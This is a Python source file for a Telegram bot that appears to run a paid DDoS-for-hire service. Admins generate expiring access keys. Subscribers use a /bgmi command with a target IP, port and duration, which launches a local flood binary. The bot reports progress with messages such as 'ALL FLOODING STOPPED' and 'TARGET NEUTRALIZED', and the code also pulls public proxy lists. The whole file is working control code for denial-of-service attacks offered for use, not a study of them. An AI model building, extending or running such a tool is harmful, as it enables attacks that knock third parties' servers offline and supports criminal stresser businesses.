from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import json
import os
import random
import string
import datetime
import asyncio
import time
import itertools  # Needed for proxy iterator

from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 100
users = {}
keys = {}
user_processes = {}

# New globals for additional functionalities
attack_limits = {}      # {user_id: max_duration (in seconds)}
cooldowns = {}          # {user_id: cooldown_duration (in seconds)}
MAX_CONCURRENT_ATTACKS = 3

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# ---------------------- Existing Commands ----------------------

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                # Build inline keyboard with a "Copy Key" button
                keyboard = [
                    [InlineKeyboardButton("Copy Key", switch_inline_query_current_chat=key)]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                response = (
                    f"💀 KEY CREATED! 💀\n\n"
                    f"🔑 KEY: <code>{key}</code>\n"
                    f"⏳ EXPIRES: {expiration_date}\n\n"
                    f"Command authorized. Courtesy of @vofuxk"
                )
                await update.message.reply_text(response, parse_mode="HTML", reply_markup=reply_markup)
            except ValueError:
                response = "⚠️ ERROR: Please specify a valid number and time unit (hours/days)."
                await update.message.reply_text(response)
        else:
            await update.message.reply_text("Usage: /genkey <amount> <hours/days>")
    else:
        await update.message.reply_text("ONLY OWNER CAN USE 💀\nOWNER @vofuxk")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = (
                f"✅ KEY REDEEMED! ✅\n\n"
                f"Access granted until: {users[user_id]}\n\n"
                f"Mission authorized. Courtesy of @vofuxk"
            )
        else:
            response = "⚠️ ERROR: Invalid or expired key. Acquire a valid key from @vofuxk."
    else:
        response = "Usage: /redeem <key>"
    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "💥 AUTHORIZED AGENTS 💥\n\n"
            for uid, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(uid), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {uid}"
                    response += f"- @{username} (ID: {uid}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {uid} expires on {expiration_date}\n"
        else:
            response = "No authorized agents found."
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

# ---------------------- Updated and New Commands ----------------------

# /start: Sends a welcome message with the user's first name if available.
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    first_name = update.message.from_user.first_name
    user_id = str(update.message.from_user.id)
    if user_id in user_processes and user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text(f"🔥 {first_name}, you already have an active attack in progress!")
    else:
        await update.message.reply_text(f"🎉 Welcome, {first_name}, to Rishi's Command Center!\nUse /help to see all available commands.")

# /help: Enhanced help message with sections and bullet points.
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "🔑 *BLURY'S COMMAND CENTER* 🔑\n\n"
        "📋 *TAP TO COPY:*\n"
        "• `/start` - Get started with a warm welcome message.\n"
        "• `/help` - Display this help message with all commands.\n"
        "• `/bgmi` - Launch an attack.\n"
        "• `/when` - Check the remaining time for current attacks.\n"
        "• `/redeem` - Activate your access key.\n"
        "• `/status` - Check your subscription status.\n"
        "• `/stop` - Abort the current operation.\n"
        "• `/resume` - Resume an interrupted attack.\n\n"
        "👮‍♂️ *Administration Commands:*\n"
        "• `/genkey` - Generate a new key (Admin only).\n"
        "• `/allusers` - List all authorized agents.\n"
        "• `/revoke` - Revoke user access (Admin only).\n"
        "• `/attack_limit` - Set maximum attack duration (Admin only).\n"
        "• `/backup` - Backup user access data (Admin only).\n"
        "• `/download_backup` - Download user data (Admin only).\n"
        "• `/set_cooldown` - Set a user’s cooldown time (in minute, Owner only).\n"
        "• `/add_admin` - Add a sub-admin (Owner only).\n"
        "• `/remove_admin` - Remove a sub-admin (Owner only).\n\n"
        "💡 *Usage Notes:*\n"
        "• Replace parameters (e.g. `<target_ip>`, `<port>`, `<duration>`, `<user_id>`, `<minutes>`) with appropriate values.\n\n"
        "• For support, contact @vofuxk.\n"
        "• Enjoy and use responsibly!\n"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

# Function to update the attack message with a reverse timer and visual progress bar.
async def update_timer(chat_id: int, message_id: int, start_time: float, duration: int, target_ip: str, port: str, context: ContextTypes.DEFAULT_TYPE):
    while True:
        elapsed = time.time() - start_time
        remaining = max(0, int(duration - elapsed))
        # Create a simple progress bar using 20 blocks
        progress = int((elapsed / duration) * 20) if duration > 0 else 0
        progress_bar = "█" * progress + "░" * (20 - progress)
        new_text = (
            f"💀 ⚠️ *ATTACK INITIATED!* 💀\n\n"
            f"💢 *SIGMA STRIKE IN EFFECT!* 💢\n\n"
            f"🎯 *TARGET SET:* `{target_ip}`\n"
            f"🔒 *PORT ACCESSED:* `{port}`\n"
            f"⏳ *DURATION LOCKED:* `{duration}` seconds\n"
            f"⏱ *TIME REMAINING:* `{remaining}` seconds\n"
            f"📊 *Progress:* `{progress_bar}`\n\n"
            f"⛔ _To halt the operation, use /stop_\n"
            f"🔥 *Unleashing force. No turning back.*\n"
            f"Powered by @vofuxk ⚡"
        )
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=new_text, parse_mode="Markdown")
        except Exception as e:
            if "Flood control" in str(e):
                await asyncio.sleep(5)
                continue
            else:
                print("Error editing message:", e)
        if remaining <= 0:
            break
        await asyncio.sleep(1)

# /bgmi: Launch an attack. Enforce one active attack per user and a global limit.
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)
    
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ ACCESS DENIED!\nRedeem a valid key from @vofuxk.")
        return

    if user_id in cooldowns:
        last_attack = cooldowns[user_id].get("last_attack", 0)
        cooldown_time = cooldowns[user_id].get("duration", 0)
        if time.time() - last_attack < cooldown_time:
            remaining = int(cooldown_time - (time.time() - last_attack))
            await update.message.reply_text(f"❌ Cooldown active. Please wait {remaining} seconds before launching a new attack.")
            return

    if len(user_processes) >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text("🚨 Maximum of 3 concurrent attacks allowed. Please wait for the current attack(s) to finish before launching a new one.")
        return

    if user_id in user_processes and user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text("❗ You already have an active attack in progress.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /bgmi <target_ip> <port> <duration>")
        return

    target_ip = context.args[0]
    port = context.args[1]
    try:
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("Duration must be a number (in seconds).")
        return

    if user_id in attack_limits and duration > attack_limits[user_id]:
        await update.message.reply_text(f"❌ Attack duration exceeds your maximum allowed duration of {attack_limits[user_id]} seconds.")
        return

    # Call the C binary 'rishi' with three arguments.
    command = ['./blury', target_ip, port, str(duration)]
    process = subprocess.Popen(command)
    start_time = time.time()
    user_processes[user_id] = {
        "process": process,
        "command": command,
        "target_ip": target_ip,
        "port": port,
        "duration": duration,
        "start_time": start_time
    }
    if user_id in cooldowns:
        cooldowns[user_id]["last_attack"] = time.time()

    # Send initial attack message with reverse timer info.
    msg = await update.message.reply_text(
        f"💀 ⚠️ *ATTACK INITIATED!* 💀\n\n"
        f"💢 *SIGMA STRIKE IN EFFECT!* 💢\n\n"
        f"🎯 *TARGET SET:* `{target_ip}`\n"
        f"🔒 *PORT ACCESSED:* `{port}`\n"
        f"⏳ *DURATION LOCKED:* `{duration}` seconds\n"
        f"⏱ *TIME REMAINING:* `{duration}` seconds\n\n"
        f"⛔ _To halt the operation, use /stop_\n"
        f"🔥 *Unleashing force. No turning back.*\n"
        f"Powered by @vofuxk ⚡", parse_mode="Markdown")
    asyncio.create_task(update_timer(update.effective_chat.id, msg.message_id, start_time, duration, target_ip, port, context))
    asyncio.create_task(monitor_attack(user_id, context, process))

# /when: Show remaining time for all active attacks.
async def when(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not user_processes:
        await update.message.reply_text("⏳ No attacks are currently in progress.")
        return
    response = "Current active attacks:\n"
    current_time = time.time()
    for uid, data in user_processes.items():
        remaining = int(data["duration"] - (current_time - data["start_time"]))
        if remaining < 0:
            remaining = 0
        response += f"🌐 Target: `{data['target_ip']}`, 📡 Port: `{data['port']}`, ⏱ Remaining Time: {remaining} seconds\n"
    await update.message.reply_text(response, parse_mode="Markdown")

# /revoke: Revoke user access (Admin only)
async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("ONLY ADMIN CAN USE THIS COMMAND.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    target_user = context.args[0]
    if target_user in users:
        del users[target_user]
        save_users()
        await update.message.reply_text(f"✅ User {target_user}'s access has been revoked.")
    else:
        await update.message.reply_text("User not found.")

# /attack_limit: Set max attack duration for a user (Admin only)
async def attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("ONLY ADMIN CAN USE THIS COMMAND.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /attack_limit <user_id> <max_duration_in_seconds>")
        return
    target_user = context.args[0]
    try:
        max_duration = int(context.args[1])
    except ValueError:
        await update.message.reply_text("Max duration must be a number.")
        return
    attack_limits[target_user] = max_duration
    await update.message.reply_text(f"✅ Attack limit for user {target_user} set to {max_duration} seconds.")

# /status: Check your subscription status.
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in users:
        await update.message.reply_text(f"✅ Your subscription is active until: {users[user_id]}")
    else:
        await update.message.reply_text("❌ You do not have an active subscription.")

# /backup: Backup user access data (Admin only)
async def backup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("ONLY ADMIN CAN USE THIS COMMAND.")
        return
    try:
        with open(USER_FILE, "r") as infile, open("backup_users.json", "w") as outfile:
            data = json.load(infile)
            json.dump(data, outfile)
        await update.message.reply_text("✅ Backup created successfully.")
    except Exception as e:
        await update.message.reply_text(f"Error creating backup: {e}")

# /download_backup: Download user data (Admin only)
async def download_backup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("ONLY ADMIN CAN USE THIS COMMAND.")
        return
    if os.path.exists("backup_users.json"):
        await context.bot.send_document(chat_id=update.effective_chat.id, document=open("backup_users.json", "rb"))
    else:
        await update.message.reply_text("No backup file found. Use /backup to create one.")

# /set_cooldown: Set a user’s cooldown time in minutes (minimum 1 minute, Owner only)
async def set_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id != OWNER_USERNAME:
        await update.message.reply_text("ONLY OWNER CAN USE THIS COMMAND.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /set_cooldown <user_id> <minutes>")
        return
    target_user = context.args[0]
    try:
        minutes = int(context.args[1])
        if minutes < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Cooldown time must be at least 1 minute.")
        return
    cooldowns[target_user] = {"duration": minutes * 60, "last_attack": 0}
    await update.message.reply_text(f"✅ Cooldown for user {target_user} set to {minutes} minutes.")

# /add_admin: (Owner only) Add a sub-admin.
async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id != OWNER_USERNAME:
        await update.message.reply_text("ONLY OWNER CAN USE THIS COMMAND.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /add_admin <user_id>")
        return
    new_admin = context.args[0]
    if new_admin not in ADMIN_IDS:
        ADMIN_IDS.append(new_admin)
        await update.message.reply_text(f"✅ User {new_admin} added as admin.")
    else:
        await update.message.reply_text("User is already an admin.")

# /remove_admin: (Owner only) Remove a sub-admin.
async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id != OWNER_USERNAME:
        await update.message.reply_text("ONLY OWNER CAN USE THIS COMMAND.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove_admin <user_id>")
        return
    rem_admin = context.args[0]
    if rem_admin in ADMIN_IDS:
        ADMIN_IDS.remove(rem_admin)
        await update.message.reply_text(f"✅ User {rem_admin} removed from admin list.")
    else:
        await update.message.reply_text("User is not an admin.")

# /stop: Abort current operation.
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ ACCESS DENIED!\nRedeem a valid key from @vofuxk.")
        return
    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text("No active attack to halt.\nOWNER @vofuxk")
        return
    user_processes[user_id]["process"].terminate()
    del user_processes[user_id]
    await update.message.reply_text(
        "🛑 OPERATION HALTED! 🛑\n\n"
        "⚡ ALL FLOODING STOPPED.\n"
        "🛡️ SYSTEM SECURED.\n"
        "🔐 PARAMETERS CLEARED.\n\n"
        "Courtesy of @vofuxk"
    )

# /resume: Restart an attack (if needed)
async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text("No active operation. Use /bgmi to initiate an attack.")
        return
    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text("🔥 ATTACK RESUMED! 🔥")

# Monitor attack: When an attack finishes, send a notification.
async def monitor_attack(user_id: str, context: ContextTypes.DEFAULT_TYPE, process: subprocess.Popen):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, process.wait)
    try:
        target_ip = user_processes[user_id]["target_ip"]
        port = user_processes[user_id]["port"]
        duration = user_processes[user_id]["duration"]
    except KeyError:
        return  # If user_processes entry is gone, exit silently.
    await context.bot.send_message(
        chat_id=int(user_id),
        text=(
            f"🔥 MISSION ACCOMPLISHED! 🔥\n\n"
            f"🎯 TARGET NEUTRALIZED: {target_ip}\n"
            f"💣 PORT BREACHED: {port}\n"
            f"⏳ DURATION: {duration} seconds\n\n"
            f"💥 Operation Complete. Courtesy of @vofuxk"
        )
    )

if __name__ == '__main__':
    load_data()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Existing handlers
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("resume", resume))

    # New handlers for additional functionalities
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("when", when))
    app.add_handler(CommandHandler("revoke", revoke))
    app.add_handler(CommandHandler("attack_limit", attack_limit))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("backup", backup))
    app.add_handler(CommandHandler("download_backup", download_backup))
    app.add_handler(CommandHandler("set_cooldown", set_cooldown))
    app.add_handler(CommandHandler("add_admin", add_admin))
    app.add_handler(CommandHandler("remove_admin", remove_admin))

    app.run_polling()
